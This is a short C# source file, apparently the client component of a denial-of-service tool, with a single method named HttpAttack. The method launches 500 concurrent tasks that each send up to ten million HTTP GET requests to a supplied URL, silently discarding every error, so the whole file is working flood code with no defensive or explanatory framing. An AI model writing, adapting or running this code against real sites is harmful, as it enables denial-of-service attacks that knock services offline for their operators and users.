using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    internal class HTTP
    {
        public static void HttpAttack(string url)
        {

            for (int j = 0; j < 500; j++)
            {
                HttpClient http = new HttpClient();
                Task.Run(async () =>
                {
                    for (int i = 0; i < 10000000; i++)
                    {
                        try
                        {
                            try
                            {
                                HttpResponseMessage response = await http.GetAsync(url);
                            }
                            catch
                            {

                            }
                        }
                        catch
                        {

                        }
                    }
                });
            }
        }
    }
}
